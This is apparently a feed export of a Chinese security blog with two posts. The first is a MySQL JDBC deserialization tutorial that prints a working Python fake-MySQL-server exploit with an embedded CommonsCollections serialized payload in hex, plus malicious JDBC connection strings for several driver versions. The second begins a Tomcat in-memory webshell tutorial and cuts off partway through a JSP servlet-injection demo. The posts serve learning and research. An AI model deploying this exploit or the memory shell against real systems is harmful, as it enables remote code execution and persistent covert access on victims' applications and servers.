class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>cc是为了用来触发反序列化的</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>首先我们的任务就是找包内有哪个类的方法里面有readObject函数，链子的作者在挖掘的时候就找到了这个入口点<strong>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</strong></p><p><img src="https://cdn.clown2024.cn/202410011740099.png" alt="image-20241001173957942"></p><p>这里就存在readObject方法，那就需要像正常找链子一样往上找了</p><blockquote><p>这里只要我们在jdbc url中设置autoDeserialize为true就可以进入到readObject里面</p><p>-84和-19是序列化对象的前两个字节，用来标识数据是否为序列化对象</p></blockquote><p><img src="https://cdn.clown2024.cn/202410012303198.png" alt="image-20241001230233251"></p><p>这里可以找到ResultSetUtil这个类的resultSetToMap</p><p>然后再继续往上找</p><p><img src="https://cdn.clown2024.cn/202410012304030.png" alt="image-20241001230435900"></p><p>最终就找到了我们的<strong>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues</strong>方法，这里执行了我们的前面提到过的<strong>SHOW SESSION STATUS</strong>语句，然后将返回的结果传入resultSetToMap方法来调用</p><p>该类是一个拦截器，在JDBC URL中设定属性queryInterceptors为<code>ServerStatusDiffInterceptor</code>时，执行查询语句会调用拦截器的preProcess和postProcess方法，这两个方法里面都调用了populateMapWithSessionStatusValues方法</p><p><img src="https://cdn.clown2024.cn/202410012317524.png" alt="image-20241001231725481"></p><p>这样就构成了我们的触发条件了</p><p>那我们的攻击思路就是，要让<strong>SHOW SESSION STATUS</strong>返回的结果是一个恶意的序列化对象，我们就需要根据MySql协议的流量格式去写一个恶意的MySql服务器让客户端连接</p><p>我们可以起一个mysql的docekr容器然后去抓一下流量来分析</p><p><img src="https://cdn.clown2024.cn/202410012324338.png" alt="image-20241001232453239"></p><p>就用前面简单的例子执行一下抓一下过程即可，如上图</p><blockquote><p>抓本地回环包需要下载npcap才行</p></blockquote><p>比如Response OK</p><p><img src="https://cdn.clown2024.cn/202410012329473.png" alt="image-20241001232901372"></p><p>我们只需要返回这些数据即可</p><p>我们的攻击过程就是照抄流量包，按照返回的顺序返回给客户端即可，我们可以执行一条SHOW SESSION STATUS的查询跟着伪造一下</p><p>然后copy一下文章有关结果集数据包的结构</p><p><img src="https://cdn.clown2024.cn/202410012333975.png" alt="image-20241001233303908"></p><ul><li>数据段1：说明下面的结果集有多少列</li><li>数据段2：列的定义</li><li>数据段3： EOF 包</li><li>数据段4：行数据。</li></ul><h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><p>这里就直接copy师傅的poc了，读一读代码学习一下</p><p>恶意mysql服务</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment">#问候消息</span><br>greeting_data=<span class="hljs-string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="hljs-comment">#响应消息</span><br>response_ok_data=<span class="hljs-string">&quot;0700000200000002000000&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_data</span>(<span class="hljs-params">conn</span>):<br>    data = conn.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data).lower()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_data</span>(<span class="hljs-params">conn,data</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    conn.send(binascii.a2b_hex(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_payload_content</span>():<br>    <span class="hljs-comment">#file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &quot;calc&quot; &gt; a</span><br>    file= <span class="hljs-string">r&#x27;a&#x27;</span><br>    <span class="hljs-keyword">if</span> os.path.isfile(file):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            payload_content = <span class="hljs-built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open successs&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;open false&quot;</span>)<br>        <span class="hljs-comment">#calc</span><br>        payload_content=<span class="hljs-string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span><br>    <span class="hljs-keyword">return</span> payload_content<br><br><span class="hljs-comment"># 主要逻辑</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        conn, addr = sk.accept()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr[<span class="hljs-number">0</span>],addr[<span class="hljs-number">1</span>]))<br><br>        <span class="hljs-comment"># 1.先发送第一个 问候报文</span><br>        send_data(conn,greeting_data)<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span><br>            receive_data(conn)<br>            send_data(conn,response_ok_data)<br><br>            <span class="hljs-comment">#其他过程</span><br>            data=receive_data(conn)<br>            <span class="hljs-comment">#查询一些配置信息,其中会发送自己的 版本号</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session.auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload=<span class="hljs-string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span><br>                send_data(conn,_payload)<br>                data=receive_data(conn)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span><br>                send_data(conn, _payload)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set names&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set character_set_results&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show session status&quot;</span> <span class="hljs-keyword">in</span> data:<br>                mysql_data = <span class="hljs-string">&#x27;0100000102&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                <span class="hljs-comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span><br>                <span class="hljs-comment">#获取payload</span><br>                payload_content=get_payload_content()<br>                <span class="hljs-comment">#计算payload长度</span><br>                payload_length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">4</span>)<br>                payload_length_hex = payload_length[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + payload_length[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                <span class="hljs-comment">#计算数据包长度</span><br>                data_len = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span> + <span class="hljs-number">4</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">6</span>)<br>                data_len_hex = data_len[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] + data_len[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + data_len[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                mysql_data += data_len_hex + <span class="hljs-string">&#x27;04&#x27;</span> + <span class="hljs-string">&#x27;fbfc&#x27;</span>+ payload_length_hex<br>                mysql_data += <span class="hljs-built_in">str</span>(payload_content)<br>                mysql_data += <span class="hljs-string">&#x27;07000005fe000022000100&#x27;</span><br>                send_data(conn, mysql_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span><br>                send_data(conn, payload)<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    HOST =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>    PORT = <span class="hljs-number">3309</span><br><br>    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <span class="hljs-comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span><br>    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    sk.bind((HOST, PORT))<br>    sk.listen(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST,PORT))<br><br>    run()<br></code></pre></td></tr></table></figure><p>Client</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ServerStatusDiffInterceptor;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">driver</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">DB_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span>;<span class="hljs-comment">//8.x使用</span><br>        Class.forName(driver);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(DB_URL);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后生成一个cc7的payload文件放在poc的目录下</p><blockquote><p>卧槽这有个奇怪的坑，ysoserial生成payload的时候命令不能用引号括起来，不然就报错了，反正我是这样的（应该是不能单引号，双引号是可以的</p></blockquote><p>执行效果</p><p><img src="https://cdn.clown2024.cn/202410012339938.png" alt="image-20241001233903839"></p><p><img src="https://cdn.clown2024.cn/202410012339163.png" alt="image-20241001233926085"></p><p>然后8.0.20之后不再调用resultSetToMap方法，也就是不再调用getObject方法了，所以这条链也就打不通了</p><h2 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h2><p>参考文章：<a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p>先说一下由于版本不同带来的改变</p><ol><li>从6.0开始主要使用的包名从·<code>com.mysql</code>变为了<code>com.mysql.cj</code>,所以<code>ServerStatusDiffInterceptor</code>所在位置也有所改变。</li><li>5.1.11-6.0.6使用的interceptors属性为statementInterceptors，8.0以上使用的为queryInterceptors。</li><li>5.1.11以下，无法直接通过连接触发：在执行getConnection时，会执行到com.mysql.jdbc.ConnectionImpl中</li></ol><p>各版本最后都是需要到getObject方法里面去进行反序列化</p><h3 id="510-5110"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h3><p>连接串如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><p>连接之后需要执行查询</p><h3 id="5111-5xxx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11-5.x.xx"></a>5.1.11-5.x.xx</h3><p>连接串如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><h3 id="6x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><p>连接串如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor<br></code></pre></td></tr></table></figure><h1 id="detectcustomcollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h1><h2 id="各版本连接串"><a href="#各版本连接串" class="headerlink" title="各版本连接串"></a>各版本连接串</h2><p>先给出各版本的连接串</p><ul><li>5.1.19-5.1.28：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.29-5.1.48：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>5.1.49：不可用</li><li>6.0.2-6.0.6：jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc</li><li>8.x.x ：不可用</li></ul><p>该链子反序列化的点也是在resultSetToMap()方法里面</p><p>payload的不同主要在于有些版本会对detectCustomCollations参数进行校验之后才会到反序列化点里面去。</p><h2 id="原理分析"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="5119-5140"><a href="#5-1-19-5-1-40" class="headerlink" title="5.1.19-5.1.40"></a>5.1.19-5.1.40</h3><p>这里的利用利用链比较简单，在getConnection的时候会调用到**com.mysql.jdbc.ConnectionImpl#buildCollationMapping()**方法</p><p><img src="https://cdn.clown2024.cn/202410030920363.png" alt="image-20241003092042235"></p><p>这里执行了SHOW COLLATION查询语句，然后调用了resultSetToMap</p><h3 id="5141-5148"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h3><p>该版本的buildCollationMapping()方法不再调用resultSetToMap方法，但是直接调用了getObject方法，所以payload也没变化</p><p><img src="https://cdn.clown2024.cn/202410030924201.png" alt="image-20241003092445101"></p><h3 id="5149"><a href="#5-1-49" class="headerlink" title="5.1.49"></a>5.1.49</h3><p>该版本就不再调用getObject方法，所以链子也就不可用了</p><h3 id="602-606"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h3><p>该版本resultSetToMap又回来了</p><p><img src="https://cdn.clown2024.cn/202410030933152.png" alt="image-20241003093358073"></p><h3 id="8xx"><a href="#8-x-x" class="headerlink" title="8.x.x"></a>8.x.x</h3><p>8.0以上不再在com.mysql.cj.jdbc.ConnectionImpl中直接执行及获取”SHOW COLLATION”语句，调用链更改，不再调用getObject()方法，此链失效</p><h1 id="mysql恶意服务器"><a href="#mysql恶意服务器" class="headerlink" title="mysql恶意服务器"></a>mysql恶意服务器</h1><p>起恶意的mysql服务还可以用fnmsd师傅的<a href="https://github.com/fnmsd/MySQL_Fake_Server">MySQL_Fake_Server项目</a>（这个我没跑起来）</p><p>还推荐一个java写的带gui的项目：<a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来学一下常见的JDBC反序列化，是MYSQL的，参考文章：&lt;a href=&quot;https://tttang.com/archive/1877/&quot;&gt;https://tttang.com/archive/1877/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;jdbc简单介绍&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>传统web应用型内存马</title>
    <link href="https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://clowsman.github.io/2024/09/14/%E4%BC%A0%E7%BB%9Fweb%E5%BA%94%E7%94%A8%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-14T14:31:10.000Z</published>
    <updated>2024-09-20T15:19:53.070Z</updated>
    
    <content type="html"><![CDATA[<p>这里是本菜鸡开始学习内存马的起始文章</p><p>有关内存马的认知可以看看su18师傅的这篇文章：<a href="https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ">https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ</a></p><p>有关tomcat源码分析的文章：<a href="https://blog.csdn.net/u010883443/article/details/107463782">Tomcat源码初识一 Tomcat整理流程图_tomcat流程图-CSDN博客</a></p><p>然后这里有一篇总结得特别全得内存马文章：<a href="https://paper.seebug.org/3120/">https://paper.seebug.org/3120/</a></p><p>这里放一张文章中的源码分析的初始化流程图：</p><p><img src="https://cdn.clown2024.cn/202409161536558.png" alt="内存马流程"></p><p>做个参考对大致流程有个概念</p><blockquote><p> 调试的时候我突然发现不应该开启tomcat的自动打开浏览器，这样调试访问前或者访问后的逻辑是才不会那么乱😢</p><p> 因为他默认是在我们访问后才会去创建实例</p></blockquote><h1 id="servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h1><h2 id="简单demo"><a href="#简单demo" class="headerlink" title="简单demo"></a>简单demo</h2><p>先写一个简单的demo然后再分析一下原理吧，先看看效果</p><blockquote><p>这里用了使用了tomcat8，tomcat10用那个demo有些类找不到</p><p>要看源码的话需要导入对应tomcat版本的依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.50<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这是tomcat的核心依赖，起服务的过程源码基本都在这里</p></blockquote><p>编写一个servlet内存马的步骤：</p><ul><li>找到StandardContext</li><li>继承并编写一个恶意servlet</li><li>创建Wapper对象</li><li>设置Servlet的LoadOnStartUp的值</li><li>设置Servlet的Name</li><li>设置Servlet对应的Class</li><li>将Servlet添加到context的children中</li><li>将url路径和servlet类做映射</li></ul><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.Servlet&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;MemoryShellInjectDemo&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        appctx.setAccessible(<span class="hljs-literal">true</span>);<br>        <span 